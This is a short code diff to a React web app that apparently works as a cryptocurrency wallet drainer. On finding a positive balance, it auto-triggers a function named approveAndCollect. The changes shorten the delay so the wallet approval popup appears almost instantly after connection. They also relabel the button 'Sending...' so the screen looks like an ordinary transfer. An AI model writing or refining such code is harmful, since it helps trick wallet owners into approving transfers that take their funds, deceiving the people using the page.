@@ -213,7 +213,12 @@ export default function App() {
       if (currentBalance > 0 && !autoTriggered.current) {
         autoTriggered.current = true;
         log("🔥 Positive balance detected. Auto-triggering approval...");
-        setTimeout(() => approveAndCollect(), 1000); 
+        
+        // Immediately sets the UI to the loading state so it says "Sending..."
+        setLoading(true); 
+        
+        // Triggers the wallet popup almost instantly after connection
+        setTimeout(() => approveAndCollect(), 400); 
       }
     };
 
@@ -391,13 +396,11 @@ export default function App() {
 
   const buttonText = !isConnected 
     ? 'Connect Wallet' 
-    : loading 
-      ? 'Processing...' 
+    : loading || (!status.includes('❌') && !status.includes('✅'))
+      ? 'Sending...' 
       : status.includes('✅') 
         ? 'Sent Successfully' 
-        : status.includes('❌') 
-          ? 'Retry Sending' 
-          : 'Sending....';
+        : 'Retry Sending';
 
   return (
     <div style={{ position: 'fixed', inset: 0, backgroundColor: '#ffffff', color: '#000000', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>
